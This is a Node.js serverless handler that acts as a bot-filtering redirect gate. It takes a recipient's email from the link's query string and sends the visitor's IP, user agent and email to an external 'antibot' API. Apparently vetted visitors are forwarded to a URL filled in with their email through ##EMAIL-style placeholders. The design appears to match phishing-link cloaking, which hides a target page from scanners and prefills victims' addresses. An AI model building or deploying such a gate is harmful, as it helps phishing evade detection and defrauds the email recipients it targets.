function readClientIp(req) {
  const forwarded = String(req.headers['x-forwarded-for'] || '').trim();
  if (forwarded) return forwarded.split(',')[0].trim();
  return String(req.headers['x-real-ip'] || '').trim();
}

function normalizeUrl(input, fallback) {
  const value = String(input || '').trim();
  if (!value) return fallback;
  if (/^https?:\/\//i.test(value)) return value;
  if (value.startsWith('/')) return value;
  return `/${value}`;
}

function applyEmailTemplate(url, email) {
  const base = String(url || '');
  if (!email) return base;
  const raw = String(email).trim();
  if (!raw) return base;
  const encoded = encodeURIComponent(raw);
  return base
    .replace(/##EMAIL_RAW/g, raw)
    .replace(/\{\{\s*email_raw\s*\}\}/gi, raw)
    .replace(/\[\s*EMAIL_RAW\s*\]/g, raw)
    .replace(/\*EMAIL_RAW/g, `*${raw}`)
    .replace(/##EMAIL/g, encoded)
    .replace(/\{\{\s*email\s*\}\}/gi, encoded)
    .replace(/\[\s*EMAIL\s*\]/g, encoded)
    .replace(/\*EMAIL/g, `*${raw}`);
}

function buildChallengeUrl(challengeBase, passUrl, failUrl, waitSeconds) {
  const isAbsolute = /^https?:\/\//i.test(challengeBase);
  const origin = isAbsolute ? undefined : 'https://gate.local';
  const parsed = new URL(challengeBase, origin);

  if (!parsed.searchParams.get('pass')) parsed.searchParams.set('pass', passUrl);
  if (!parsed.searchParams.get('fail')) parsed.searchParams.set('fail', failUrl);
  if (!parsed.searchParams.get('wait')) parsed.searchParams.set('wait', String(waitSeconds));

  if (isAbsolute) return parsed.toString();
  return `${parsed.pathname}${parsed.search}${parsed.hash}`;
}

function redirect(res, target, sessionId) {
  res.setHeader('Set-Cookie', `ds_session=${sessionId}; Path=/; HttpOnly; SameSite=Lax; Max-Age=604800`);
  res.writeHead(302, { Location: target, 'Cache-Control': 'no-store' });
  res.end();
}

module.exports = async (req, res) => {
  const host = String(req.headers.host || '');
  const proto = String(req.headers['x-forwarded-proto'] || 'https');
  const userAgent = String(req.headers['user-agent'] || '');
  const ip = readClientIp(req);

  const sessionId =
    String((req.headers.cookie || '').match(/(?:^|;\s*)ds_session=([^;]+)/)?.[1] || '').trim() ||
    `sess_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`;

  const passRaw = normalizeUrl(req.query.pass, '/human');
  const failRaw = normalizeUrl(req.query.fail, '/bot');
  const challengeRaw = normalizeUrl(req.query.challenge, '/challenge');
  const waitSeconds = Math.max(0, Number(req.query.wait || 10));
  const apiUrl =
    String(process.env.ANTIBOT_API_URL || '').trim() || 'https://api.maptrapptechnology.com/api/antibot/assess';

  const email =
    String(req.query.email || req.query.e || req.query.recipient || req.query.to || req.query.user || '').trim();

  const passUrl = applyEmailTemplate(passRaw, email);
  const failUrl = applyEmailTemplate(failRaw, email);
  const challengeUrl = buildChallengeUrl(challengeRaw, passUrl, failUrl, waitSeconds);

  const pageUrl = `${proto}://${host}${req.url || '/go'}`;
  const fingerprint = `${host}|${userAgent}|${ip}`;

  const payload = {
    sessionId,
    fingerprint,
    pageUrl,
    referrer: String(req.headers.referer || ''),
    path: '/go',
    source: 'direct',
    email,
    behavior: {
      mouseMoves: 0,
      clicks: 0,
      keydowns: 0,
      scrolls: 0,
      dwellMs: 0
    }
  };

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'CF-Connecting-IP': ip,
        'X-Forwarded-For': ip,
        'User-Agent': userAgent
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json().catch(() => ({}));
    const action = String(data?.action || '').toLowerCase();

    if (action === 'block') return redirect(res, failUrl, sessionId);
    if (action === 'challenge') return redirect(res, failUrl, sessionId);
    if (action === 'allow') return redirect(res, challengeUrl, sessionId);
    return redirect(res, failUrl, sessionId);
  } catch (_error) {
    return redirect(res, failUrl, sessionId);
  }
};
